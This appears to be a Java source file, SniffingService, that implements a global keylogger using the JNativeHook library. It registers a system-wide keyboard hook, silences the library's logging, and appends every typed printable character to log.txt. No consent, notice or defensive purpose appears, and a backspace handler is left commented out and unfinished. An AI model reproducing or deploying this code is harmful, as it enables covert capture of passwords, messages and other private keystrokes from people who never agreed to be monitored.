package org.Spring.Sniffing;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.util.logging.Level;
import java.util.logging.Logger;

public class SniffingService implements NativeKeyListener {
    private RandomAccessFile writer;

    public SniffingService() {
        try {
            writer = new RandomAccessFile("log.txt", "rw");
            writer.seek(writer.length());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void startSniffing() {
        // Disable JNativeHook's internal logging
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);

        // Register the key listener to capture global key events
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        GlobalScreen.addNativeKeyListener(this);
    }

    private void logKey(String logText) {
        try {
            writer.writeBytes(logText);
            writer.getFD().sync(); // Ensure that data is written to the file
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {

        if (Character.isDefined(e.getKeyChar()) && !Character.isISOControl(e.getKeyChar())) {
            logKey(e.getKeyChar() + "");
        } /*else if (e.getKeyChar()) {
            removeLastCharacter();
            System.out.println("Backspace");
        }*/
    }
    private boolean isBackspace(int keyCode) {
        return keyCode == 0;
    }
    private void removeLastCharacter() {
        try {
            long length = writer.length() ;
            if(length > 0)
                writer.setLength(length - 1);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

